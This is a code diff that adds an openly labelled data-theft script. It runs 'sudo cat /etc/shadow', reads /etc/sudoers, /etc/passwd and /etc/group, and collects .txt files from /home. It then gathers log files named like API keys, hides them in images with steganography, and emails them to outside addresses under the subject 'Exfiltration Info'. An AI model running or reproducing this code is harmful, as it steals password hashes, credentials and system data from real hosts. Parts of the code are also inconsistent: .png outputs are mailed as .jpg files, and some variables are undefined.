@@ -91,4 +91,88 @@ class SkillCheck:
 
 def basicScan():
     # ------- Inspiration -------
-    etcshadow_bot = SkillCheck(_
+    etcshadow_bot = SkillCheck("Home Directory Health")
+    etcshadow_bot.inspiration('sudo cat /etc/shadow', True)
+
+    poncho_bot = SkillCheck("Privilege Audit")
+    poncho_bot.inspiration('sudo cat /etc/sudoers', True)
+
+    # ------- Investigation -------
+    home_bot = SkillCheck("Home Folder | .txt")
+    home_bot.investigation('/home/', '*.txt', True)
+
+    # ------- Proficiency -------
+    ip_addr_bot = SkillCheck("IP")
+    ip_addr_bot.proficiency('ip addr')
+
+    online_users_bot = SkillCheck("Online Users")
+    online_users_bot.proficiency('who')
+
+    passwd_bot = SkillCheck("/etc/passwd")
+    passwd_bot.proficiency('cat /etc/passwd')
+
+    host_bot = SkillCheck("Host System")
+    host_bot.proficiency('uname -a')
+
+    group_bot = SkillCheck("Groups")
+    group_bot.proficiency("cat /etc/group")
+
+
+# ------- Exfiltration -------
+
+def secret_ingredient():
+    mosquito_in_amber()
+    steg_command('./logs/API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'steg.png')
+    steg_command('elbow_grease.txt', 'dfstd.png')
+
+
+def one_mail():
+    send_email(
+        'living.like.bob.was.taken@gmail.com',
+        secret_var,
+        'riwos15373@pngzero.com',
+        'Exfiltration Info',
+        'Two pictures that are not at all dinosaur related.',
+        './steg.jpg'
+    )
+
+    send_email(
+        'living.like.bob.was.taken@gmail.com',
+        secret_var,
+        'radecab534@lewou.com',
+        'Exfiltration Info',
+        'Two pictures that are not at all dinosaur related.',
+        './dfstd.jpg'
+    )
+
+
+def combine_logs(directory):
+    # Safe create directory
+    os.makedirs(directory, exist_ok=True)
+
+    master_log = os.path.join(directory, 'API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
+
+    with open(master_log, 'w') as file:
+        file.write('===========================================================\n')
+
+    for log in os.listdir(directory):
+        if log.startswith('API_KEY_nat1') and log != os.path.basename(master_log):
+            full_path = os.path.join(directory, log)
+            with open(full_path, 'r') as log_file:
+                content = log_file.read()
+
+            with open(master_log, 'a') as file:
+                file.write(content + '\n')
+
+
+# ------- Execution -------
+
+def __main__():
+    combine_logs('./logs')
+    secret_ingredient()
+    basicScan()
+    one_mail()
+
+
+if __name__ == '__main__':
+    __main__()
